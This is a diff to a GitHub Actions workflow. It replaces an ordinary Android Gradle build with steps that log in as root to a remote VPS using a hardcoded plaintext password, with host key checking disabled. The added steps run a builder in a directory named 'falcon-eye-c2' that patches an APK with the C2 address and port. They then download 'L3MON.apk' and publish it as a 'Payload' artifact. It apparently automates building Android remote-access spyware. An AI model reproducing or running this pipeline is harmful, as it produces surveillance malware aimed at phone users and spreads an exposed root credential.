@@ -11,27 +11,20 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: set up JDK 17
-        uses: actions/setup-java@v4
-        with:
-          java-version: '17'
-          distribution: 'temurin'
-          cache: gradle
+      - name: Install sshpass
+        run: sudo apt-get update && sudo apt-get install -y sshpass
 
-      - name: Setup Android SDK
-        uses: android-actions/setup-android@v3
-
-      - name: Build with Gradle Wrapper
+      - name: Trigger Remote Build on VPS
         run: |
-          if [ -d "app" ]; then
-            gradle wrapper --gradle-version 8.4
-            ./gradlew assembleDebug
-          else
-            echo "No Android project found, skipping gradle build"
-          fi
+          sshpass -p 'n036mKelPVXd' ssh -o StrictHostKeyChecking=no root@77.105.133.37 "cd /opt/falcon-eye-c2/server && node -e \"const apkBuilder = require('./includes/apkBuilder'); apkBuilder.patchAPK('77.105.133.37', '22222', (err) => { if(err) console.error(err); else apkBuilder.buildAPK((err) => { if(err) console.error(err); else console.log('BUILD_DONE'); }) });\""
+
+      - name: Download APK from VPS
+        run: |
+          mkdir -p app/build/outputs/apk/debug/
+          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no root@77.105.133.37:/opt/falcon-eye-c2/server/assets/webpublic/L3MON.apk app/build/outputs/apk/debug/FalconEye.apk
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: FalconEye-Debug-APK
+          name: FalconEye-Payload-APK
           path: app/build/outputs/apk/debug/*.apk
